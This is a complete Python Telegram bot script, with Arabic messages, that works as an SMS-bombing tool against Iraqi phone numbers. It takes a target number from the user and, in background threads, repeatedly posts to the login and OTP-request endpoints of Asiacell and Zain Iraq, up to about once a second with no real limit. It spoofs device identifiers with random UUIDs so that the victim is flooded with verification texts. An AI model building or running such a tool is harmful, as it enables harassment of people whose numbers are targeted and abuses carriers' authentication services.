import telebot
from telebot import *
import requests
import time
import threading
from uuid import uuid4

token = 'حط توكن '


bot = telebot.TeleBot(token)

user_requests = {}
user_re = {}
stop_spam = False

@bot.message_handler(commands=["start"])
def start(message):		
    meo = telebot.types.InlineKeyboardButton(text='مبرمج البوت', url='https://t.me/IRSe0')
    jj = telebot.types.InlineKeyboardButton(text='سبام اثير', callback_data='spam')
    ase = telebot.types.InlineKeyboardButton(text='سبام اسيا', callback_data='ass')
    stop_button = telebot.types.InlineKeyboardButton(text='إيقاف السبام', callback_data='stop_spam')

    ke = types.InlineKeyboardMarkup()
    ke.add(jj, ase)
    ke.add(meo, stop_button)
    user = message.from_user.first_name
    bot.send_message(message.chat.id, f'*أهلا بك عزيزي [ {user} ] في بوت ايهم*', reply_markup=ke, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def r(call):
    global stop_spam
    if call.data == 'spam':
        stop_spam = False
        
        yy = '''*ارسل رقم الهاتف الذي تريد عمل له سبام
يرجى الارسال بدون 0
مثال : 7809245678
بدون كود الدوله وبدون 0

اذا اكملت الكلام ارسل رقمك
ex : 78098543648
*'''
        bot.send_message(call.message.chat.id, yy, parse_mode="Markdown")
        bot.register_next_step_handler(call.message, process_phone_number)
        
    elif call.data == 'ass':
        stop_spam = False
        yy = '''*ارسل رقم الهاتف الذي تريد عمل له سبام
يرجى الارسال الرقم حصرا مع 0
مثال : 07789648751

اذا اكملت الكلام ارسل رقمك
ex : 07789648751 المبرمج ايهم
*'''
        bot.send_message(call.message.chat.id, yy, parse_mode="Markdown")
        bot.register_next_step_handler(call.message, process_phone_numbe)
    
    elif call.data == 'stop_spam':
        stop_spam = True
        bot.send_message(call.message.chat.id, "تم إيقاف عملية السبام بنجاح.")

def process_phone_numbe(message):
    global phone_number
    phone_number = message.text.strip()
    user_id = message.from_user.id
    
    if user_id not in user_requests:
        user_requests[user_id] = {'count': 0, 'last_request_time': 0}
    current_time = time.time()
    time_since_last_request = current_time - user_requests[user_id]['last_request_time']

    if time_since_last_request >= 86400:
        user_requests[user_id]['count'] = 0
    if user_requests[user_id]['count'] < 1000000000000000:
        count = user_requests[user_id]['count']
        user_requests[user_id]['last_request_time'] = current_time
        message_text = f"تم إرسال سبام بنجاح\n إلى الرقم : {phone_number}\nعدد الاسبام الحالي : {count + 1}\nبواسطة : @IRSe0"
        message_response = bot.send_message(user_id, message_text)

        def send_requests():
            local_count = count
            for i in range(1000000000000000):
                if stop_spam:
                    bot.send_message(user_id, "تم إيقاف السبام.")
                    break
                local_count += 1
                user_requests[user_id]['count'] += 1
                headers = {
                    'X-ODP-API-KEY': str(uuid4()),
                    'DeviceID': str(uuid4()),
                    'X-OS-Version': '13',
                    'X-Device-Type': f'[Android][hasneen][hasneen-LX2 13] [TIRAMISU]',
                    'X-ODP-APP-VERSION': '3.8.0',
                    'X-FROM-APP': 'odp',
                    'X-ODP-CHANNEL': 'mobile',
                    'X-SCREEN-TYPE': 'MOBILE',
                    'Cache-Control': 'private, max-age=240',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Content-Length': '43',
                    'Host': 'odpapp.asiacell.com',
                    'Connection': 'Keep-Alive',
                    'Accept-Encoding': 'gzip',
                    'User-Agent': 'okhttp/5.0.0-alpha.2'}
                data = {"captchaCode": "", "username": phone_number}
                rr = requests.post('https://odpapp.asiacell.com/api/v1/login?lang=ar', headers=headers, json=data).text

                if '"success":true' in rr:
                    new_message_text = f"تم إرسال سبام بنجاح\n إلى الرقم : {phone_number}\nعدد الاسبام الحالي : {local_count}\nبواسطة : @IRSe0"
                    if message_response.text != new_message_text:
                        bot.edit_message_text(new_message_text, chat_id=user_id, message_id=message_response.message_id)
                else:
                    bot.send_message(user_id, "حدث خطأ أثناء إرسال السبام.")
                    break
                
                time.sleep(1)

        threading.Thread(target=send_requests).start()
    else:
        bot.send_message(user_id, "*لقد قمت بإرسال 20 طلب في آخر 24 ساعة. يمكنك المحاولة مرة أخرى بعد 24 ساعة.\nاذا تريد تفعيل vip راسل @IRSe0*", parse_mode="Markdown")

def process_phone_number(message):
    global phone_number
    phone_number = message.text.strip()
    user_id = message.from_user.id
    
    if user_id not in user_re:
        user_re[user_id] = {'count': 0, 'last_request_time': 0}
    current_time = time.time()
    time_since_last_request = current_time - user_re[user_id]['last_request_time']

    if time_since_last_request >= 0:
        user_re[user_id]['count'] = 0
    if user_re[user_id]['count'] < 1000000000000000:
        count = user_re[user_id]['count']
        user_re[user_id]['last_request_time'] = current_time
        message_text = f"تم إرسال سبام بنجاح\n إلى الرقم : {phone_number}\nعدد الاسبام الحالي : {count + 1}\nبواسطة : @IRSe0"
        message_response = bot.send_message(user_id, message_text)

        def send_requests():
            local_count = count
            for i in range(1000000000000000):
                if stop_spam:
                    bot.send_message(user_id, "تم إيقاف السبام.")
                    break
                local_count += 1
                user_re[user_id]['count'] += 1
                headers = {
                    'Host': 'mw-mobileapp.iq.zain.com',
                    'Accept': '*/*',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Zain Iraq iq.zain/3.10 Coder',
                    'Connection': 'close'
                }
                data = {'msisdn': phone_number, 'user_space': 'mbb'}
                rr = requests.post('https://mw-mobileapp.iq.zain.com/api/otp/request', headers=headers, json=data).text

                if '"status": "success"' in rr:
                    new_message_text = f"تم إرسال سبام بنجاح\n إلى الرقم : {phone_number}\nعدد الاسبام الحالي : {local_count}\nبواسطة : @IRSe0"
                    if message_response.text != new_message_text:
                        bot.edit_message_text(new_message_text, chat_id=user_id, message_id=message_response.message_id)
                else:
                    bot.send_message(user_id, "حدث خطأ أثناء إرسال السبام.")
                    break
                
                time.sleep(1)

        threading.Thread(target=send_requests).start()
    else:
        bot.send_message(user_id, "*لقد قمت بإرسال 20 طلب في آخر 24 ساعة. يمكنك المحاولة مرة أخرى بعد 24 ساعة.\nاذا تريد تفعيل vip راسل @IRSe0*", parse_mode="Markdown")

bot.infinity_polling()